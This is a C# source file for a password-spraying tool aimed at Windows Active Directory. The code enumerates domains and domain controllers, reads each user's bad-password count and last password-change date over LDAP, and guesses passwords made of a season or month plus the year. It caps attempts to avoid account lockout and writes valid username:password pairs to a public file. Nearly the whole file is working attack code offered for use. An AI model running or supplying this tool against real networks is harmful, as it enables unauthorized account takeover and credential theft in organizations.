using System;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.AccountManagement;
using System.Collections.Generic;
using System.IO;

namespace SmartishSpray
{
    class SmartishSprayer
    {
        private Domain _domain;
        public Domain DomainInfo => _domain;
        public DomainController _domainController;
        public DomainController DomainControllerInfo =>_domainController;
        private string _ldapPath;
        public string LdapPath => _ldapPath;
        private int _numPasswords = 2;
        private UserInfo[] _userList;
        public UserInfo[] UserList =>_userList;

        public struct UserInfo
        {
            public int badPwdCount;
            public string[] passwordList;
            public DateTime pwdLastSet;
            public string samUserName;
        }

        public SmartishSprayer()
        {
        }

        public void BuildPasswordLists()
        {
            for(int i = 0; i < _userList.Length; i++)
            {
                _userList[i].passwordList = new string[_numPasswords];

                _userList[i].passwordList[0] = getSeason(_userList[i].pwdLastSet) + _userList[i].pwdLastSet.Year.ToString();
                _userList[i].passwordList[1] = _userList[i].pwdLastSet.ToString("MMMM") + _userList[i].pwdLastSet.Year.ToString();

                if (_userList[i].passwordList[1].Length < 8)
                {
                    _userList[i].passwordList[1] += "!";
                }
            }
        }

        private string getSeason(DateTime date)
        {
            int month = date.Month;
            string season = "";
            if (3 <= month && month < 6)
            {
                season = "Spring";
            }
            else if (6 <= month && month < 9)
            {
                season = "Summer";
            }
            else if (9 <= month && month < 12)
            {
                season = "Fall";
            }
            else
            {
                season = "Winter";
            }

            return season;
        }

        public void GetLDAPPath()
        {
            Forest forest = Forest.GetCurrentForest();

            while (true)
            {
                int idx = 0;
                int selection = 0;
                DomainCollection domains = forest.Domains;

                foreach (Domain domain in domains)
                {
                    Console.WriteLine(String.Format("[{0}] : {1}", idx, domain.Name));
                }

                Console.Write("\nPlease select a domain: ");

                try
                {
                    selection = Convert.ToInt32(Console.ReadLine());
                } 
                catch
                {
                    continue;
                }
                
                if( 0 <= selection && selection < domains.Count)
                {
                    _domain = domains[selection];
                    break;
                }
                else
                {
                    Console.WriteLine("Invalid Choice");
                    continue;
                }
            }

            while (true)
            {
                int idx = 0;
                int selection = 0;

                DomainControllerCollection dcs = _domain.DomainControllers;

                foreach (DomainController dc in dcs)
                {
                    string pdcRole = "";
                    if( dc.Roles.Contains(ActiveDirectoryRole.PdcRole) )
                    {
                        pdcRole = "[PDC]";
                    }
                    Console.WriteLine(String.Format("[{0}] : {1} {2}", idx, dc.Name, pdcRole));
                }

                Console.Write("\nPlease select a domain controller: ");

                try
                {
                    selection = Convert.ToInt32(Console.ReadLine());
                }
                catch
                {
                    continue;
                }

                if (0 <= selection && selection < dcs.Count)
                {
                    _domainController = dcs[selection];
                    break;
                }
                else
                {
                    Console.WriteLine("Invalid Choice");
                    continue;
                }
            }

            _ldapPath = "LDAP://" + _domainController.Name + "/";

            foreach(string val in _domain.Name.Split("."))
            {
                _ldapPath += "dc=" + val + ",";
            }
            
            // remove trailing comma
            _ldapPath = _ldapPath.Substring(0, _ldapPath.Length - 1);

            Console.WriteLine(_ldapPath);
        }

        public void GetADUsers()
        {
            try
            {
                DirectoryEntry dEntry = new DirectoryEntry(_ldapPath);
                DirectorySearcher dSearcher = new DirectorySearcher(dEntry);
                dSearcher.Filter = "(&(objectCategory=person)(objectClass=user))";

                // Get the first entry of the search.  
                SearchResultCollection results = dSearcher.FindAll();

                if (results != null)
                {
                    _userList = new UserInfo[results.Count];
                    for(int i = 0; i < results.Count; i++)
                    {
                        SearchResult res = results[i];
                        UserInfo user = new UserInfo();
                        user.badPwdCount = (int)res.Properties["badPwdCount"][0];
                        user.samUserName = res.Properties["samAccountName"][0].ToString();
                        user.pwdLastSet = DateTime.FromFileTimeUtc((long)res.Properties["pwdLastSet"][0]);
                        _userList[i] = user;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error retrieving user info");
                Console.WriteLine("Exception : " + e.Message);
            }
        }

        public void SprayUsers()
        {
            Console.WriteLine("");
            using (PrincipalContext context = new PrincipalContext(ContextType.Domain, _domain.Name))
            {
                foreach (UserInfo user in _userList)
                {
                    for( int i = 0; i < _numPasswords - user.badPwdCount; i++)
                    {
                        bool valid = false;

                        try
                        {
                            valid = context.ValidateCredentials(user.samUserName, user.passwordList[i]);
                        }
                        catch
                        {
                            continue;
                        }
                        if(valid)
                        {
                            Console.WriteLine(String.Format("{0}:{1}", user.samUserName, user.passwordList[i]));

                            using (StreamWriter fout = File.AppendText(@"C:\Users\Public\sprayed.txt"))
                            {
                               fout.WriteLine(String.Format("{0}:{1}", user.samUserName, user.passwordList[i]));
                            }

                            break;
                        }
                    }
                }
            }
        }
    }
}
